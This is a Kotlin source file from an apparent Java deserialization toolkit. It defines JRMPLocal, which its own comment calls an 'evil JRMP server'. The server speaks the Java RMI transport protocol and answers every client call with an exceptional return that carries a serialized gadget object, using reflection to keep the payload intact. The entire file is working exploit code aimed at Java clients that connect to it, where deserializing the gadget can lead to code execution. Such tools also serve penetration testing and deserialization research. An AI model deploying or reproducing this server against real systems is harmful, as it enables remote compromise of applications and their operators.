package top.ceclin.jser.tool.jrmp

import io.ktor.network.sockets.*
import io.ktor.utils.io.*
import io.ktor.utils.io.core.*
import io.ktor.utils.io.streams.*
import org.joor.Reflect
import sun.rmi.server.MarshalOutputStream
import sun.rmi.transport.TransportConstants
import top.ceclin.jser.tool.ExceptionGadget
import top.ceclin.jser.tool.PayloadOfGadget
import java.beans.PropertyChangeEvent
import java.beans.PropertyVetoException
import java.io.ByteArrayInputStream
import java.io.IOException
import java.io.ObjectInputStream
import java.net.InetSocketAddress
import java.rmi.server.UID

/**
 * An evil JRMP server that returns a failed result with [exceptionGadget] for any client operation.
 *
 * Its implementation refers to following methods:
 * 1. [sun.rmi.transport.tcp.TCPTransport.ConnectionHandler.run0]
 */
class JRMPLocal(
    private val exceptionGadget: ExceptionGadget,
    port: Int,
) {
    private val server = SocketServer(port) { socket ->
        val input = socket.openReadChannel()
        val output = socket.openWriteChannel(autoFlush = true)
        val magic = input.readInt()
        if (magic != TransportConstants.Magic)
            return@SocketServer
        val version = input.readShort()
        if (version != TransportConstants.Version)
            throw IOException("unsupported version: $version")
        when (val protocol = input.readByte()) {
            TransportConstants.SingleOpProtocol -> handleSingleOp(input, output)
            TransportConstants.StreamProtocol -> handleStream(socket.remoteAddress as InetSocketAddress, input, output)
            else -> {
                output.writeByte(TransportConstants.ProtocolNack)
                throw IOException("unsupported protocol: $protocol")
            }
        }
    }

    private suspend fun handleSingleOp(input: ByteReadChannel, output: ByteWriteChannel) {
        when (val op = input.readByte()) {
            TransportConstants.Ping -> output.writeByte(TransportConstants.PingAck)
            TransportConstants.Call -> handleCall(input, output)
            else -> throw IOException("unsupported op: $op")
        }
    }

    private suspend fun handleStream(remote: InetSocketAddress, input: ByteReadChannel, output: ByteWriteChannel) {
        output.writePacket {
            writeByte(TransportConstants.ProtocolAck)
            compatWriteUTF(with(remote) { hostName ?: address.toString() })
            writeInt(remote.port)
        }
        input.compatReadUTF() // host
        input.readInt() // port
        handleSingleOp(input, output)
    }

    /**
     * Its implementation refers to following methods:
     * 1. [sun.rmi.transport.Transport.serviceCall]
     * 2. [sun.rmi.server.UnicastServerRef.dispatch]
     * 3. [sun.rmi.transport.StreamRemoteCall.getResultStream]
     */
    private suspend fun handleCall(input: ByteReadChannel, output: ByteWriteChannel) {
        output.writePacket {
            writeByte(TransportConstants.Return)
            MarshalOutputStream(outputStream()).also {
                Reflect.on(it).call("enableReplaceObject", false)
            }.let {
                it.writeByte(TransportConstants.ExceptionalReturn.toInt())
                UID().write(it)
                it.writeObject(exceptionGadget)
            }
        }
    }

    fun start(): Unit = server.start()
    fun stop(): Unit = server.stop()
}